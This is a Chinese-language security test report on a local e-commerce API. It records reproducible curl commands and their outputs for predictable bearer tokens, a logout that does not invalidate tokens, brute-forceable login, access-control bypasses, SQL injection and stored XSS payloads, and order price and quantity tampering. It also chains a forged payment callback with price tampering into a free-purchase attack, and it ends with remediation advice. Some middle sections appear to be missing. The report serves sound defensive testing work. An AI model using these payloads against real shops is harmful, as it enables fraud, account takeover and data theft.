# L2-7 安全专项

> 四个方向：**认证、越权、输入、金额篡改**，各给出至少 1 条实测记录。
> 所有记录均为实际执行结果，命令可直接复制复现。

## 1. 认证

### 1.1 凭证可被预测：`tk_<用户ID>`（BUG-02）

最严重的一条。token 的生成方式是 `TOKEN_PREFIX + str(row["id"])`，即 `tk_2`。攻击者不需要任何凭据，把数字换一换就能扮演任意用户，包括 admin。

```bash
# 完全未登录，直接拼 admin 的 token
curl -s http://127.0.0.1:8080/api/users/1 -H 'Authorization: Bearer tk_1'
```

```text
{"code": 0, "message": "ok", "data": {"id": 1, "username": "admin", "realName": "系统管理员", "phone": "13800138001", "role": "admin", "createdAt": "2026-09-01T08:00:00Z"}}
```

**实测结论**：用户 ID 是自增连续整数（1~5），枚举 5 次即可拿到全部账号，含 admin。

### 1.2 登出无效

```bash
curl -s -X POST http://127.0.0.1:8080/api/auth/logout -H 'Authorization: Bearer tk_2'
curl -s http://127.0.0.1:8080/api/orders/mine -H 'Authorization: Bearer tk_2'
```

```text
{"code": 0, "message": "ok", "data": {"message": "已退出登录"}}
{"code": 0, "message": "ok", "data": {"total": 1, "items": [{"id": 1, "orderNo": "SO202609180001", "userId": 2, ...}]}}
```

**实测结论**：登出接口返回成功，但 token 继续可用。服务端没有任何 token 状态存储，`current_user()` 只是把 token 里的数字查一次库。

### 1.3 登录接口无频率限制

```bash
# 连续 20 次错误密码
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} " -X POST http://127.0.0.1:8080/api/auth/login \
    -H 'Content-Type: application/json' -d '{"username":"alice","password":"wrong"}'
done
```

```text
401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401
```

**实测结论**：20 次全部正常返回 401，无锁定、无延迟、无验证码，可无限次暴力破解口令。


```text
{"code": 0, "message": "ok", "data": {"total": 2, "items": [{"id": 2, "orderNo": "SO202609200002", "userId": 3, "userName": "bob", ... "receiverPhone": "13800138003", "address": "兰州市安宁区安宁西路88号", ...}, ...]}}
```

### 2.4 越权写：下架他人商品（BUG-04）

```bash
curl -s -X PATCH http://127.0.0.1:8080/api/products/1/status \
  -H 'Authorization: Bearer tk_2' -H 'Content-Type: application/json' -d '{"status":"off"}'
```


**汇总**：4 条越权，覆盖"读用户 / 读订单 / 进管理端 / 改商品"。共性是**只判断了"是否登录"，没有判断"是否有权"**。

## 3. 输入

### 3.1 SQL 注入（BUG-05，未授权可打）

```bash
curl -s -G http://127.0.0.1:8080/api/products \
  --data-urlencode "keyword=' OR '1'='1" -d status=on
```

```text
{"code": 0, "message": "ok", "data": {"total": 12, "page": 1, "pageSize": 10, "items": [{"id": 1, "title": "无线蓝牙耳机", ... "status": "on" ...
```

对照：正常关键词返回 `total: 0`，注入串返回 `total: 12`——条件被短路，且返回了本不该出现的记录。

源码定位：`app.py:338` `conditions.append("p.title LIKE '%" + keyword + "%'")`，无参数化。

**危害升级路径**：该接口无需登录，SQLite 支持 `UNION SELECT`，可把 `users` 表的 `password`、`phone` 拼进商品列表返回，实现未授权拖库。

### 3.2 存储型 XSS（BUG-16）

```bash
curl -s -X POST http://127.0.0.1:8080/api/product-reviews \
  -H 'Authorization: Bearer tk_2' -H 'Content-Type: application/json' \
  -d '{"productId":1,"content":"<script>alert(1)</script><img src=x onerror=alert(2)>","rating":5}'
curl -s 'http://127.0.0.1:8080/api/product-reviews?productId=1' \
  | grep -o '<div class="content">.*</div>'
```

```text
<div class="content"><script>alert(1)</script><img src=x onerror=alert(2)></div></div>
```

**结论**：标签原样落地，无任何转义。任何访问该商品评价页的用户都会执行攻击者脚本。

### 3.3 类型混淆导致 500（BUG-07）

```bash
curl -s http://127.0.0.1:8080/api/products/abc
curl -s 'http://127.0.0.1:8080/api/products?page=abc'
curl -s -X POST http://127.0.0.1:8080/api/orders -H 'Authorization: Bearer tk_2' \
  -H 'Content-Type: application/json' -d '{"productId":1,"quantity":"两件"}'
```

```text
{"code": 50000, "message": "服务内部错误", "data": null}
{"code": 50000, "message": "服务内部错误", "data": null}
{"code": 50000, "message": "服务内部错误", "data": null}
```

### 3.4 分页参数可绕过条数限制

```bash
curl -s 'http://127.0.0.1:8080/api/products?pageSize=-1'
```

```text
{"code": 0, "message": "ok", "data": {"total": 11, "page": 1, "pageSize": -1, "items": [...]}}
```

单看这一条说明不了什么——种子数据只有 11 个商品，返回 11 条很正常。为了证明它真能绕过限制，我先把在售商品造到 71 个，再对比不同 `pageSize` 的实际返回条数：

```text
pageSize=50    total=71   实际返回=50
pageSize=-1    total=71   实际返回=71
pageSize=1000  total=71   实际返回=71
pageSize=0     total=71   实际返回=0
```

**实测结论**：`pageSize=50` 正确截断在 50 条，但 `pageSize=-1` 和 `pageSize=1000` 都返回了全部 71 条。原因是 `app.py:348` 用 `LIMIT %d` 直接拼接，而 SQLite 中 `LIMIT -1` 表示"不限制"，等于绕过了分页。`pageSize=0` 返回 0 条但 `total=71`，前端会陷入"有数据却显示空白"的状态。

这三行对比正好说明了为什么"只说 `pageSize` 没校验"不够——**必须造出超过上限的数据，才能证明绕过是真实发生的，而不是种子数据碰巧不够多**。

## 4. 金额篡改

### 4.1 篡改单价（BUG-08）

```bash
curl -s -X POST http://127.0.0.1:8080/api/orders \
  -H 'Authorization: Bearer tk_2' -H 'Content-Type: application/json' \
  -d '{"productId":2,"quantity":1,"unitPrice":1}'
```

```text
{"code": 0, "message": "ok", "data": {"id": 3, "orderNo": "SO202611250003", "productId": 2, "productTitle": "机械键盘 87 键", "quantity": 1, "unitPrice": 1, "totalAmount": 1.0, "status": "created", ...}}
```

12900 分的机械键盘，**1 分钱下单成功**。

### 4.2 篡改总额

```bash
curl -s -X POST http://127.0.0.1:8080/api/orders \
  -H 'Authorization: Bearer tk_2' -H 'Content-Type: application/json' \
  -d '{"productId":2,"quantity":1,"totalAmount":1}'
```

```text
{"code": 0, "message": "ok", "data": {"id": 4, "orderNo": "SO202611250004", "productId": 2, ... "unitPrice": 12900, "totalAmount": 1, "status": "created", ...}}
```

单价是对的 12900，但总额被直接覆盖成 1。

### 4.3 负数量使金额为负、库存反增（BUG-09）

```bash
curl -s -X POST http://127.0.0.1:8080/api/orders \
  -H 'Authorization: Bearer tk_2' -H 'Content-Type: application/json' \
  -d '{"productId":2,"quantity":-5}'
curl -s http://127.0.0.1:8080/api/products/2
```

```text
{"code": 0, "message": "ok", "data": {"id": 4, ..., "quantity": -5, "unitPrice": 12900, "totalAmount": -64500.0, ...}}
{"code": 0, "message": "ok", "data": {"id": 2, "title": "机械键盘 87 键", "price": 12900, "stock": 13, ...}}
```

库存从 8 变成 13——`stock - (-5)` 变成了加法。

### 4.4 伪造支付回调把订单变为已支付（BUG-15）

**完整攻击链的最后一环**，且该接口公开、无鉴权、无验签：

```bash
# 攻击前
curl -s http://127.0.0.1:8080/api/orders/1 -H 'Authorization: Bearer tk_2'
# 伪造回调
curl -s -X POST http://127.0.0.1:8080/api/payments/callback \
  -H 'Content-Type: application/json' \
  -d '{"orderId":1,"paymentId":"PAY_FAKE_999","result":"success"}'
# 攻击后
curl -s http://127.0.0.1:8080/api/orders/1 -H 'Authorization: Bearer tk_2'
```

```text
回调前 status= created paidAt= None
{"code": 0, "message": "ok", "data": {"orderId": 1, "status": "paid"}}
回调后 status= paid paidAt= 2026-11-25T04:07:11Z
```

### 4.5 完整 0 元购链路（组合验证）

把 4.1 和 4.4 串起来，构成一条可以白拿商品的完整路径：

| 步骤 | 操作 | 结果 |
|---|---|---|
| 1 | 下单时传 `unitPrice=1` | 订单金额变成 1 分 |
| 2 | 伪造 `result=success` 回调 | 订单状态变 `paid` |
| 3 | 等待发货 | 实付 0.01 元拿到 129 元的商品 |

这条链路不需要任何账号的合法凭据，也不需要真实支付。**只要两条都修好，链路即断裂。**

## 5. 汇总

| 方向 | 实测条数 | 最严重问题 |
|---|---|---|
| 认证 | 3 | token = `tk_+ID`，未登录可冒充 admin |
| 越权 | 4 | 4 类越权全覆盖，含管理端 |
| 输入 | 4 | 未授权 SQL 注入 + 存储型 XSS |
| 金额篡改 | 5 | 1 分钱下单 + 伪造回调 = 0 元购 |

**共性根因**（修一批不如修一类）：

1. **鉴权只做"认证"不做"授权"**——`current_user()` 取到用户后，几乎所有 handler 只判空，不比对资源归属。建议抽 `require_owner(resource_user_id)` 与 `require_admin()` 两个装饰器，统一在路由层前执行。
2. **"客户端传什么就信什么"**——`unitPrice`、`totalAmount`、`quantity`、`keyword` 全部直接进逻辑或 SQL。原则应是：**能由服务端推出的字段，一律不接受客户端传值**。
3. **缺少统一入参校验层**——`int()` 裸调用出现在 4 处，每处都是 500。建议在路由分发前统一做类型与范围校验。
